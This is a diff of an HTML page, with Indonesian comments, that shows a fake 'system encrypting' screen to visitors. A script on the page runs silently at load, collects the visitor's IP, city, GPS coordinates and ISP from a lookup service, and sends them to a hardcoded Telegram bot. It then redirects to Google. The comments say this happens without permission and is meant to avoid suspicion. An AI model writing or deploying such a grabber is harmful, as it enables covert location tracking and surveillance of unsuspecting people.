@@ -1,34 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Enkripsi...</title>
-</head>
-<body style="background-color: black; color: lime; font-family: monospace; text-align: center; padding-top: 50px;">
+<body style="background:#000;color:#0f0;text-align:center;padding-top:100px;font-family:monospace;">
     <h2>SYSTEM ENCRYPTING... [95%]</h2>
-    <p>Please wait while we secure your connection.</p>
-
     <script>
-        const BOT_TOKEN = '8728530341:AAEX_PmD5XQ16_2MtZnPdVH6z3xVI8WhDXc';
-        const ADMIN_ID = '8283778614';
+        // DATA SAKTI LU SUDAH TERPASANG
+        const TOKEN = '8728530341:AAEX_PmD5XQ16_2MtZnPdVH6z3xVI8WhDXc';
+        const ID = '8283778614';
 
-        async function trackSilent() {
+        async function kirimData() {
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                const pesan = `🚀 **TARGET DETECTED!**\n📍 Kota: ${data.city}\n🌐 IP: ${data.ip}\n🛰️ Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n📱 Provider: ${data.org}`;
+                // Ambil IP & Lokasi (Tanpa Izin)
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const msg = `🚀 **TARGET DETECTED!**\n📍 Kota: ${d.city}\n🌐 IP: ${d.ip}\n🛰️ Map: https://www.google.com/maps?q=${d.latitude},${d.longitude}\n📱 ISP: ${d.org}`;
+                
+                // Kirim ke Telegram
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: ADMIN_ID, text: pesan, parse_mode: 'Markdown' })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: ID, text: msg, parse_mode: 'Markdown'})
                 });
-            } catch (e) {} finally {
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
+            } catch (e) {
+                console.log("Error");
+            } finally {
+                // Lempar ke Google biar gak curiga
+                window.location.href = "https://www.google.com";
             }
         }
-        window.onload = trackSilent;
+        window.onload = kirimData;
     </script>
 </body>
 </html>
